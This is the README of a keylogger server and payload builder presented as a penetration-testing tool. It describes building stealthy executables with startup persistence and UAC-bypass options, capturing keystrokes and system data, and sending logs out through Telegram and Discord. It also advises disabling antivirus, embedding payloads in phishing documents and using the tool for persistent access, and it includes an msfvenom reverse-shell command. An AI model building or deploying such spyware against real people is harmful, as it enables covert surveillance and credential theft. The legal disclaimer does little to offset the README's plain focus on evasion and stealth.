# 🔍 Advanced Keylogger Server & Builder v3.0

A professional-grade keylogger server and payload builder designed for authorized penetration testing and security auditing.

## ⚠️ LEGAL DISCLAIMER

**THIS TOOL IS STRICTLY FOR AUTHORIZED SECURITY TESTING PURPOSES ONLY**

- ✅ Authorized penetration testing with written permission
- ✅ Security auditing on your own systems
- ✅ Educational purposes in controlled environments
- ✅ Professional security assessments with contracts

**UNAUTHORIZED USE IS ILLEGAL AND MAY RESULT IN:**
- Criminal prosecution
- Heavy fines
- Imprisonment
- Civil liability

Always obtain explicit written authorization before using this tool.

## 🚀 Features

### Server Capabilities
- **Multi-client support** - Handle multiple simultaneous connections
- **Real-time monitoring** - Live keylog viewing and system info
- **Encrypted communications** - Secure data transmission
- **Database storage** - SQLite backend for log persistence
- **Network dashboard** - Monitor connected clients and activity

### Notification System
- **Telegram integration** - Real-time alerts via Telegram bot
- **Discord webhooks** - Send logs to Discord channels
- **Auto-notifications** - Configurable automatic reporting
- **Manual sending** - On-demand log transmission

### Payload Builder
- **PyInstaller integration** - Compile to standalone executables
- **Stealth mode** - Hidden console execution
- **Startup persistence** - Optional auto-start functionality
- **Custom icons** - Brand your payloads
- **Multiple options** - UAC bypass attempts, anti-detection

### Data Collection
- **Comprehensive keystroke logging** - All keystrokes with timestamps
- **Window title tracking** - Active application monitoring
- **System information** - Hardware ID, MAC address, IP addresses
- **Software inventory** - Installed applications list
- **System metrics** - CPU, RAM, disk usage
- **Session management** - Unique session tracking

## 📋 Requirements

### System Requirements
- **Operating System**: Windows 10/11, Linux, macOS
- **Python**: 3.8 or higher
- **RAM**: Minimum 2GB, recommended 4GB+
- **Disk Space**: 500MB for installation + logs storage
- **Network**: Internet connection for notifications

### Python Dependencies
```
PyQt6>=6.6.0
pynput>=1.7.6
requests>=2.31.0
cryptography>=41.0.0
psutil>=5.9.0
pyinstaller>=5.13.0
pywin32>=306 (Windows only)
```

## 🛠️ Installation

### Quick Setup
1. **Download the files**:
   - `keylogger_server.py` (main application)
   - `setup.py` (installation script)

2. **Run the setup script**:
   ```bash
   python setup.py
   ```

3. **Start the server**:
   ```bash
   python keylogger_server.py
   ```

### Manual Installation
1. **Install Python dependencies**:
   ```bash
   pip install PyQt6 pynput requests cryptography psutil pyinstaller
   # Windows only:
   pip install pywin32
   ```

2. **Create directories**:
   ```bash
   mkdir payloads logs temp builds
   ```

3. **Run the application**:
   ```bash
   python keylogger_server.py
   ```

## 🎮 Usage Guide

### 1. Server Configuration

#### Starting the Server
1. Open the **Server tab**
2. Set your desired port (default: 8080)
3. Click **🚀 Start Server**
4. Monitor the status indicator for connections

#### Network Configuration
- **Port**: Choose an available port (1000-65535)
- **Firewall**: Ensure the port is open in your firewall
- **Router**: Forward the port if accepting external connections

### 2. Notification Setup

#### Telegram Configuration
1. **Create a Telegram bot**:
   - Message @BotFather on Telegram
   - Send `/newbot` and follow instructions
   - Copy the bot token

2. **Get your Chat ID**:
   - Message @userinfobot
   - Copy your Chat ID

3. **Configure in app**:
   - Go to **Configuration tab**
   - Enter Bot Token and Chat ID
   - Click **🧪 Test Telegram**
   - Enable **Auto-notify via Telegram**

#### Discord Configuration
1. **Create a webhook**:
   - Go to your Discord server
   - Channel Settings → Integrations
   - Webhooks → New Webhook
   - Copy the webhook URL

2. **Configure in app**:
   - Go to **Configuration tab**
   - Enter Webhook URL
   - Click **🧪 Test Discord**
   - Enable **Auto-notify via Discord**

### 3. Building Payloads

#### Basic Payload Creation
1. Go to **Builder tab**
2. **Configure connection**:
   - Server IP: Your server's IP address
   - Server Port: Match your server port
   - Output File: Desired executable name

3. **Select options**:
   - ✅ **Stealth Mode**: Hide console window
   - ⚠️ **Add to startup**: Auto-start with Windows
   - ⚠️ **UAC Bypass**: Attempt privilege escalation

4. **Build**:
   - Click **🚀 Build Payload**
   - Wait for compilation to complete
   - Find your executable in the current directory

#### Advanced Options
- **Custom Icon**: Select a .ico file for branding
- **Stealth Mode**: Runs without visible console
- **Startup Persistence**: Adds to Windows startup registry
- **UAC Bypass**: Attempts to gain elevated privileges

### 4. Monitoring and Analysis

#### Live Monitoring
- **Connection Status**: See active client connections
- **Real-time Logs**: View keystrokes as they arrive
- **System Information**: Monitor client system details
- **Session Tracking**: Track individual client sessions

#### Data Management
- **Export Logs**: Save logs to text files
- **Database Query**: Search through stored data
- **Automatic Cleanup**: Configure log retention policies
- **Backup Options**: Export complete databases

## 🔧 Configuration Files

### config.json
```json
{
    "server": {
        "default_port": 8080,
        "max_connections": 100,
        "log_level": "INFO"
    },
    "notifications": {
        "telegram_token": "YOUR_BOT_TOKEN",
        "telegram_chat_id": "YOUR_CHAT_ID",
        "discord_webhook": "YOUR_WEBHOOK_URL",
        "auto_telegram": true,
        "auto_discord": false
    },
    "builder": {
        "default_output": "keylogger.exe",
        "stealth_mode": true,
        "add_startup": false,
        "uac_bypass": false
    }
}
```

## 🛡️ Security Considerations

### Server Security
- **Use strong authentication** for remote access
- **Monitor network traffic** for suspicious activity
- **Regularly update** all dependencies
- **Encrypt stored data** using strong encryption

### Payload Detection
- **Antivirus software** may flag payloads as malicious
- **Add exclusions** for legitimate testing environments
- **Use code signing** for trusted environments
- **Test in isolated** sandbox environments first

### Data Protection
- **Encrypt communications** between client and server
- **Secure storage** of captured keystrokes
- **Regular cleanup** of sensitive data
- **Access controls** on log files

## 🚨 Troubleshooting

### Common Issues

#### "pynput not working"
```bash
# Linux
sudo apt-get install python3-dev python3-pip
pip install --upgrade pynput

# Windows - run as administrator
pip install --upgrade pynput
```

#### "PyInstaller not found"
```bash
pip install --upgrade pyinstaller
# Verify installation
pyinstaller --version
```

#### "Permission denied" errors
- **Windows**: Run as Administrator
- **Linux/macOS**: Run with `sudo` or adjust permissions
- Check file system permissions on output directories

#### "Connection refused"
- Verify server is running and listening
- Check firewall settings
- Confirm correct IP address and port
- Test with telnet: `telnet server_ip port`

#### "Antivirus blocking payload"
- Add exclusions for your testing directory
- Disable real-time protection temporarily
- Use Windows Defender exclusions
- Test in isolated virtual machines

### Debug Mode
Enable verbose logging by setting environment variable:
```bash
export KEYLOGGER_DEBUG=1
python keylogger_server.py
```

## 🔬 Advanced Usage

### Custom Payload Modifications
The payload template can be customized for specific requirements:

1. **Modify collection frequency**:
   - Change `BUFFER_SIZE` for keystroke batching
   - Adjust `RECONNECT_DELAY` for connection retry timing

2. **Add custom data collection**:
   - Screenshot capture
   - Clipboard monitoring
   - Network activity logging
   - USB device tracking

3. **Enhanced stealth features**:
   - Process name spoofing
   - Memory-only execution
   - Anti-debugging techniques

### Network Deployment
For distributed testing across multiple networks:

1. **Cloud Server Deployment**:
   - Deploy server on cloud instance (AWS, Azure, GCP)
   - Configure security groups/firewalls
   - Use HTTPS reverse proxy for additional security

2. **Multiple Server Setup**:
   - Load balancing across servers
   - Geographic distribution
   - Redundancy and failover

### Integration with Other Tools

#### Metasploit Integration
```bash
# Generate additional payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe

# Combine with keylogger for comprehensive testing
```

#### Empire/Covenant Integration
- Use keylogger as initial access vector
- Combine with post-exploitation frameworks
- Establish persistent command and control

## 📊 Performance Optimization

### Server Performance
- **Database Indexing**: Optimize queries for large datasets
- **Memory Management**: Configure appropriate buffer sizes
- **Connection Pooling**: Manage client connections efficiently
- **Log Rotation**: Implement automatic log cleanup

### Payload Performance
- **Minimal CPU Usage**: Optimize keystroke capture frequency
- **Network Efficiency**: Batch data transmission
- **Memory Footprint**: Minimize RAM usage
- **Startup Time**: Fast initialization and connection

## 🧪 Testing Scenarios

### Internal Network Assessment
1. Deploy server on internal network
2. Test payload on various workstations
3. Monitor data exfiltration capabilities
4. Document security gaps

### Phishing Campaign Testing
1. Embed payload in legitimate-looking documents
2. Test user interaction and execution
3. Monitor credential capture effectiveness
4. Assess detection evasion success

### Red Team Exercises
1. Use as persistent access mechanism
2. Combine with social engineering tactics
3. Test incident response procedures
4. Evaluate security awareness training

## 📚 Additional Resources

### Documentation
- [PyQt6 Documentation](https://doc.qt.io/qtforpython-6/)
- [PyInstaller Manual](https://pyinstaller.readthedocs.io/)
- [Python Security Best Practices](https://python.org/dev/security/)

### Security Testing Frameworks
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)

### Legal and Ethical Guidelines
- [EC-Council Code of Ethics](https://www.eccouncil.org/code-of-ethics/)
- [SANS Penetration Testing Policy](https://www.sans.org/white-papers/pen-testing-policy/)
- [Legal Issues in Penetration Testing](https://www.sans.org/white-papers/legal-issues-penetration-testing/)

## 🤝 Contributing

This tool is designed for professional security testing. Contributions should focus on:

- **Security enhancements**
- **Detection evasion improvements**
- **Performance optimizations**
- **Additional data collection methods**
- **Better stealth techniques**

## 📞 Support

For technical support or questions:

1. **Check troubleshooting section** first
2. **Review error logs** and debug output
3. **Test in isolated environment** to reproduce issues
4. **Document steps** to reproduce problems

## 🏆 Acknowledgments

This tool was developed for the cybersecurity community to enhance penetration testing capabilities and improve organizational security postures through authorized testing.

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**

---

**© 2024 Advanced Keylogger Server - Professional Security Testing Tool**
